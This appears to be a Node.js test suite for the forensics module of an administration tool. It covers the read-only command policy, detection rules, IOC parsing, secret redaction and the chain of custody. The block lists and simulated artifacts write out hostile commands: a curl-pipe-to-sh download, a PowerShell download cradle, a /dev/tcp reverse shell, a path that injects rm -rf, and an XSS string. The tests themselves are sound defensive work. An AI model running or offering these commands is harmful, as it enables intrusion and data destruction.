const { describe, it } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = path.join(__dirname, '..', '..', 'src', 'main', 'services', 'forensics');
const load = (p) => require(path.join(root, p));

const {
  assertReadOnly, fitsWindowsCommandLimit, buildShCommand, buildPowerShellCommand, shQuote
} = load('commandBuilder');
const { getAllCollectors, getCollectors } = load('collectors');
const { NETWORK_PROFILES } = load('collectors/network-device');
const { analyzeCase } = load('analysis');
const { redactText } = load('redaction');
const { EvidenceStore, sha256 } = load('EvidenceStore');
const { parseIocFile, matchIocs, ipMatchesCidr } = load('rules/iocs');
const { compareCases } = load('compare');
const { createEvidenceZip, crc32 } = load('report/evidencePackage');
const { build: buildReport } = load('report');
const { assertSafeDir, listUploadTools, runUploadTool } = load('uploadTools');

function tmpDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

describe('Forense: política de solo lectura', () => {
  it('todos los colectores integrados cumplen la política', () => {
    const all = getAllCollectors();
    assert.ok(all.length > 50, 'debe haber un catálogo amplio de colectores');
    for (const c of all) {
      assert.doesNotThrow(() => assertReadOnly(c), `colector bloqueado: ${c.id}`);
    }
  });

  it('los scripts de Windows caben en el límite de cmd.exe', () => {
    for (const c of getAllCollectors().filter((x) => x.shell === 'powershell')) {
      assert.ok(fitsWindowsCommandLimit(c.script), `script demasiado largo: ${c.id}`);
    }
  });

  it('no hay identificadores de colector duplicados por plataforma', () => {
    for (const platform of ['linux', 'windows']) {
      const ids = getCollectors({ platform, profile: 'full' }).map((c) => c.id);
      assert.strictEqual(new Set(ids).size, ids.length, `duplicados en ${platform}`);
    }
    for (const vendor of Object.keys(NETWORK_PROFILES)) {
      const ids = getCollectors({ platform: 'network', profile: 'full', vendor }).map((c) => c.id);
      assert.strictEqual(new Set(ids).size, ids.length, `duplicados en ${vendor}`);
    }
  });

  it('el perfil rápido es un subconjunto del completo', () => {
    const quick = getCollectors({ platform: 'linux', profile: 'quick' }).map((c) => c.id);
    const full = new Set(getCollectors({ platform: 'linux', profile: 'full' }).map((c) => c.id));
    assert.ok(quick.length > 0);
    quick.forEach((id) => assert.ok(full.has(id), id));
  });

  it('bloquea comandos de modificación en sh', () => {
    const bad = [
      'rm -rf /tmp/x',
      'echo hola > /etc/passwd',
      'curl http://evil | sh',
      'systemctl stop auditd',
      'ls; chmod 777 /etc/shadow',
      'iptables -F',
      'find / -name x -delete',
      'cat /etc/passwd >> /tmp/out'
    ];
    for (const script of bad) {
      assert.throws(() => assertReadOnly({ shell: 'sh', script }), /bloqueado/, script);
    }
  });

  it('permite lecturas habituales en sh (incluidos patrones entre comillas)', () => {
    const good = [
      "ps -eo pid,user,args | grep -E 'rm -rf|wget' ; ls -la /etc 2>/dev/null",
      'cat /etc/passwd',
      "find /tmp -type f -printf '%T+ %p\\n' 2>/dev/null"
    ];
    for (const script of good) {
      assert.doesNotThrow(() => assertReadOnly({ shell: 'sh', script }), script);
    }
  });

  it('bloquea comandos de modificación en PowerShell', () => {
    const bad = [
      'Remove-Item C:\\x -Recurse',
      'Set-ItemProperty HKLM:\\x y',
      'Invoke-WebRequest http://evil',
      'Stop-Service WinDefend',
      'reg add HKLM\\Software\\x',
      'iex (New-Object Net.WebClient).DownloadString("http://x")'
    ];
    for (const script of bad) {
      assert.throws(() => assertReadOnly({ shell: 'powershell', script }), /bloqueado/, script);
    }
    assert.doesNotThrow(() => assertReadOnly({ shell: 'powershell', script: 'Get-Process | Format-List Name,Id | Out-String' }));
  });

  it('solo permite comandos de consulta en dispositivos de red', () => {
    ['show version', 'show running-config | include snmp', 'get system status', '/ip route print'].forEach((script) => {
      assert.doesNotThrow(() => assertReadOnly({ shell: 'device', script }), script);
    });
    ['configure terminal', 'show version; reload', 'write memory', 'delete flash:x', 'show x | tee y', 'enable'].forEach((script) => {
      assert.throws(() => assertReadOnly({ shell: 'device', script }), undefined, script);
    });
  });

  it('rechaza shells desconocidos y comandos vacíos', () => {
    assert.throws(() => assertReadOnly({ shell: 'zsh', script: 'ls' }));
    assert.throws(() => assertReadOnly({ shell: 'sh', script: '   ' }));
  });

  it('construye comandos con quoting seguro', () => {
    assert.strictEqual(shQuote("it's"), "'it'\\''s'");
    assert.match(buildShCommand('id', { sudo: true }), /^sudo -n /);
    assert.match(buildPowerShellCommand('Get-Date'), /-EncodedCommand [A-Za-z0-9+/=]+ 2>&1$/);
  });
});

describe('Forense: motor de reglas', () => {
  const ruleIds = (r) => r.findings.map((f) => f.ruleId);

  it('detecta indicadores en un host Linux simulado', () => {
    const result = analyzeCase({
      platform: 'linux',
      caseData: { target: { host: 'srv1', platform: 'linux' } },
      artifacts: {
        'linux.proc.list': 'USER PID COMMAND\nroot 4242 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\nroot 77 /usr/sbin/sshd -D',
        'linux.persist.cron': '* * * * * root curl -s http://203.0.113.9/x.sh | sh',
        'linux.net.listen': 'tcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=1,fd=3))\n'
      }
    });
    const ids = ruleIds(result);
    assert.ok(ids.includes('LNX-PROC-REVSHELL'), ids.join(','));
    assert.ok(ids.includes('LNX-CRON-DOWNLOAD'), ids.join(','));
    assert.strictEqual(result.summary.risk, 'critical');
    const f = result.findings.find((x) => x.ruleId === 'LNX-PROC-REVSHELL');
    assert.ok(f.mitre.some((m) => /^T\d{4}/.test(m.id)), 'debe incluir referencias MITRE');
    assert.ok(f.evidence.length > 0);
    assert.match(f.id, /^F-\d{3}$/);
  });

  it('no genera hallazgos con una salida benigna', () => {
    const result = analyzeCase({
      platform: 'linux',
      artifacts: {
        'linux.proc.list': 'USER PID COMMAND\nroot 1 /sbin/init\nroot 77 /usr/sbin/sshd -D',
        'linux.persist.cron': '# m h dom mon dow command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly'
      }
    });
    assert.strictEqual(result.findings.length, 0);
    assert.strictEqual(result.summary.risk, 'none');
  });

  it('detecta PowerShell codificado en Windows (salida JSON)', () => {
    const b64 = Buffer.from('IEX (New-Object Net.WebClient).DownloadString("http://x/y")', 'utf16le').toString('base64');
    const result = analyzeCase({
      platform: 'windows',
      caseData: { target: { host: 'win1', platform: 'windows' } },
      artifacts: {
        'windows.proc.list': JSON.stringify([
          { name: 'powershell.exe', pid: 100, ppid: 200, path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: `powershell.exe -nop -w hidden -EncodedCommand ${b64}` },
          { name: 'notepad.exe', pid: 101, ppid: 200, path: 'C:\\Windows\\System32\\notepad.exe', cmd: 'notepad.exe' }
        ])
      }
    });
    assert.ok(ruleIds(result).includes('WIN-PROC-ENCODED-PS'), ruleIds(result).join(','));
  });

  it('detecta configuración insegura en equipos de red', () => {
    const result = analyzeCase({
      platform: 'network',
      caseData: { target: { host: 'sw1', platform: 'network', vendor: 'cisco-ios' } },
      artifacts: {
        'network.sec.snmp': 'snmp-server community public RO\nsnmp-server community s3cr3t RW'
      }
    });
    assert.ok(ruleIds(result).includes('NET-SNMP-DEFAULT'), ruleIds(result).join(','));
  });

  it('las coincidencias con IOCs generan hallazgos', () => {
    const result = analyzeCase({
      platform: 'linux',
      artifacts: {
        'linux.net.established': 'ESTAB 0 0 10.0.0.5:51234 198.51.100.77:443 users:(("curl",pid=9,fd=3))'
      },
      iocs: { ips: ['198.51.100.77'], domains: [], hashes: [], strings: [] }
    });
    const ioc = result.findings.find((f) => f.ruleId === 'IOC-IP');
    assert.ok(ioc, 'debe existir hallazgo IOC-IP');
    assert.ok(ioc.evidence[0].excerpt.includes('198.51.100.77'));
  });
});

describe('Forense: IOCs', () => {
  it('importa y clasifica IOCs de TXT/CSV/JSON (con refang)', () => {
    const txt = parseIocFile('203.0.113.7\nevil[.]example[.]com\n' + 'a'.repeat(64) + '\n# comentario\n/tmp/.x/miner\n', '.txt');
    assert.ok(txt.ips.includes('203.0.113.7'));
    assert.ok(txt.domains.includes('evil.example.com'));
    assert.strictEqual(txt.hashes.length, 1);
    assert.ok(txt.strings.includes('/tmp/.x/miner'));

    const json = parseIocFile(JSON.stringify({ ips: ['198.51.100.1'], domains: ['x.test'] }), '.json');
    assert.ok(json.ips.includes('198.51.100.1'));
    assert.ok(json.domains.includes('x.test'));

    const csv = parseIocFile('type,value\nip,192.0.2.10\n', '.csv');
    assert.ok(csv.ips.includes('192.0.2.10'));
  });

  it('soporta CIDR', () => {
    assert.strictEqual(ipMatchesCidr('10.1.2.3', '10.1.0.0/16'), true);
    assert.strictEqual(ipMatchesCidr('10.2.2.3', '10.1.0.0/16'), false);
  });

  it('matchIocs localiza coincidencias por línea y artefacto', () => {
    const hits = matchIocs(
      { 'linux.proc.list': 'root 1 /tmp/.x/miner --pool x\nroot 2 /sbin/init' },
      { ips: [], domains: [], hashes: [], strings: ['/tmp/.x/miner'] }
    );
    assert.ok(hits.length >= 1);
    assert.strictEqual(hits[0].collectorId, 'linux.proc.list');
  });
});

describe('Forense: redacción de secretos', () => {
  it('oculta contraseñas, tokens y claves', () => {
    const input = [
      'password=SuperSecreto123',
      'enable secret 5 $1$abcd$XyZ123456789',
      'username admin privilege 15 password 7 0822455D0A16',
      'snmp-server community s3cr3t RW',
      'Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123456789',
      'mysql://root:hunter2@db.local/app',
      '-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----',
      'AKIAABCDEFGHIJKLMNOP'
    ].join('\n');
    const out = redactText(input);
    ['SuperSecreto123', 'XyZ123456789', '0822455D0A16', 's3cr3t', 'abcdefghijklmnopqrstuvwxyz0123456789', 'hunter2', 'AKIAABCDEFGHIJKLMNOP'].forEach((secret) => {
      assert.ok(!out.includes(secret), `no debe contener ${secret}`);
    });
    assert.ok(out.includes('[REDACTED PRIVATE KEY]'));
  });

  it('conserva texto legítimo (sin falsos positivos habituales)', () => {
    const line = 'Oct 30 10:00:01 host sshd[123]: Failed password for root from 203.0.113.9 port 22 ssh2';
    assert.strictEqual(redactText(line), line);
  });
});

describe('Forense: almacén de evidencias y cadena de custodia', () => {
  it('guarda artefactos con SHA-256 y detecta manipulaciones', async () => {
    const base = tmpDir('nt-forensics-');
    try {
      const store = new EvidenceStore(base);
      const { caseId } = await store.createCase({ host: 'srv-test', platform: 'linux', targetKind: 'local' });
      const entry = await store.writeArtifact(caseId, 'linux.test.a', 'hola\n', { category: 'meta', title: 'A', command: 'echo' });
      assert.strictEqual(entry.sha256, sha256(Buffer.from('hola\n')));
      await store.appendAudit(caseId, { event: 'test' });
      await store.writeManifest(caseId);

      let v = await store.verifyCase(caseId);
      assert.strictEqual(v.ok, true);
      assert.strictEqual(v.manifestOk, true);
      assert.strictEqual(v.checked, 1);

      // Manipular un artefacto
      fs.appendFileSync(path.join(base, caseId, entry.file), 'x');
      v = await store.verifyCase(caseId);
      assert.strictEqual(v.ok, false);
      assert.deepStrictEqual(v.mismatches, [entry.file]);

      const cases = await store.listCases();
      assert.strictEqual(cases.length, 1);
      assert.strictEqual(cases[0].caseId, caseId);

      await store.deleteCase(caseId);
      assert.strictEqual((await store.listCases()).length, 0);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  it('rechaza identificadores de caso con path traversal', async () => {
    const store = new EvidenceStore(tmpDir('nt-forensics-'));
    assert.throws(() => store.getCaseDir('../../etc'), /no válido/);
    assert.throws(() => store.getCaseDir('..\\x'), /no válido/);
  });

  it('los artefactos binarios no se leen como texto', async () => {
    const base = tmpDir('nt-forensics-');
    try {
      const store = new EvidenceStore(base);
      const { caseId } = await store.createCase({ host: 'h', platform: 'linux' });
      await store.writeArtifact(caseId, 'linux.a', 'texto', {});
      await store.writeBinaryArtifact(caseId, 'upload.uac.zip', Buffer.from([0, 1, 2, 3]), {});
      const all = await store.readAllArtifacts(caseId);
      assert.deepStrictEqual(Object.keys(all), ['linux.a']);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });
});

describe('Forense: comparación de casos', () => {
  it('detecta puertos y usuarios nuevos y desaparecidos', () => {
    const mk = (passwd, listen) => ({
      case: { caseId: 'x', target: { host: 'h', platform: 'linux' } },
      findings: { findings: [] },
      artifactsText: { 'linux.users.passwd': passwd, 'linux.net.listen': listen }
    });
    const base = mk('root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash', 'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*');
    const cur = mk('root:x:0:0::/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash', 'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*\ntcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:*');
    const diff = compareCases(base, cur);
    const users = diff.sections.find((s) => s.collectorId === 'linux.users.passwd');
    assert.ok(users.added.some((l) => l.startsWith('backdoor')));
    assert.ok(users.removed.some((l) => l.startsWith('bob')));
    const listen = diff.sections.find((s) => s.collectorId === 'linux.net.listen');
    assert.strictEqual(listen.addedCount, 1);
  });
});

describe('Forense: informes y paquete de evidencias', () => {
  const data = {
    case: { caseId: 'c1', createdAt: new Date().toISOString(), status: 'completed', operator: 'tester', profile: 'quick', target: { host: 'h1', label: 'h1', platform: 'linux' } },
    artifacts: [{ collectorId: 'linux.test', title: 'T', category: 'meta', sha256: 'a'.repeat(64), size: 3, ok: true, command: 'echo' }],
    findings: {
      summary: { counts: { critical: 1, high: 0, medium: 0, low: 0, info: 0 }, score: 40, risk: 'critical', total: 1, tactics: [] },
      facts: {},
      findings: [{ id: 'F-001', ruleId: 'X', title: 'Hallazgo <b>', severity: 'critical', description: 'd', recommendation: 'r', mitre: [], count: 1, evidence: [{ collectorId: 'linux.test', excerpt: 'password=hunter2 <script>alert(1)</script>' }] }]
    },
    timeline: { events: [] },
    aiSummary: null,
    audit: []
  };

  it('genera MD/HTML/JSON, escapa HTML y redacta secretos', () => {
    const md = buildReport('markdown', data, { redact: true });
    assert.ok(md.includes('Hallazgo'));
    assert.ok(!md.includes('hunter2'));
    const html = buildReport('html', data, { redact: true });
    assert.ok(!html.includes('<script>alert(1)</script>'), 'el HTML debe escapar el contenido');
    assert.ok(!html.includes('hunter2'));
    assert.doesNotThrow(() => JSON.parse(buildReport('json', data, { redact: true })));
    assert.ok(buildReport('markdown', data, { redact: false }).includes('hunter2'));
  });

  it('crea un ZIP válido con CRC correcto', async () => {
    const base = tmpDir('nt-forensics-zip-');
    try {
      const caseDir = path.join(base, 'case');
      fs.mkdirSync(path.join(caseDir, 'artifacts'), { recursive: true });
      fs.writeFileSync(path.join(caseDir, 'case.json'), '{"a":1}');
      fs.writeFileSync(path.join(caseDir, 'artifacts', 'x.txt'), 'contenido');
      const dest = path.join(base, 'out.zip');
      await createEvidenceZip(caseDir, dest, [{ name: 'report/informe.md', data: Buffer.from('# informe') }]);
      const buf = fs.readFileSync(dest);
      assert.strictEqual(buf.readUInt32LE(0), 0x04034b50, 'cabecera local ZIP');
      assert.ok(buf.includes(Buffer.from('artifacts/x.txt')));
      assert.ok(buf.includes(Buffer.from('report/informe.md')));
      // fin de directorio central
      assert.ok(buf.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06])) > 0);
      assert.strictEqual(crc32(Buffer.from('123456789')) >>> 0, 0xcbf43926);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });
});

describe('Forense: modo subir herramientas', () => {
  it('lista el catálogo con plataformas', () => {
    const tools = listUploadTools();
    assert.ok(tools.find((t) => t.id === 'uac' && t.platforms.includes('linux')));
    assert.ok(tools.find((t) => t.id === 'autorunsc' && t.platforms.includes('windows')));
  });

  it('valida el directorio temporal remoto', () => {
    assert.doesNotThrow(() => assertSafeDir('/tmp/.nt-0123456789ab', 'linux'));
    assert.throws(() => assertSafeDir('/tmp/.nt-0123456789ab; rm -rf /', 'linux'));
    assert.throws(() => assertSafeDir('/etc', 'linux'));
    assert.doesNotThrow(() => assertSafeDir('C:\\Windows\\Temp\\nt-0123456789ab', 'windows'));
    assert.throws(() => assertSafeDir('C:\\Windows', 'windows'));
  });

  it('exige confirmación, hash válido y coincidente antes de tocar el host', async () => {
    const file = path.join(tmpDir('nt-up-'), 'tool.bin');
    fs.writeFileSync(file, 'binario');
    const common = { service: {}, sshConnections: {}, emit: () => {} };
    const target = { kind: 'ssh-session', tabId: 't1' };

    await assert.rejects(runUploadTool({ ...common, payload: { toolId: 'uac', target, localPath: file, expectedSha256: sha256(Buffer.from('binario')) } }), /confirm/i);
    await assert.rejects(runUploadTool({ ...common, payload: { toolId: 'uac', target, localPath: file, confirmModify: true, expectedSha256: 'zz' } }), /SHA-256/);
    await assert.rejects(runUploadTool({ ...common, payload: { toolId: 'uac', target: { kind: 'local' }, localPath: file, confirmModify: true, expectedSha256: sha256(Buffer.from('binario')) } }), /SSH/);
    await assert.rejects(runUploadTool({ ...common, payload: { toolId: 'uac', target, localPath: file, confirmModify: true, expectedSha256: 'a'.repeat(64) } }), /no coincide/);
    await assert.rejects(runUploadTool({ ...common, payload: { toolId: 'nope', target, localPath: file, confirmModify: true } }), /no soportada/);
  });
});
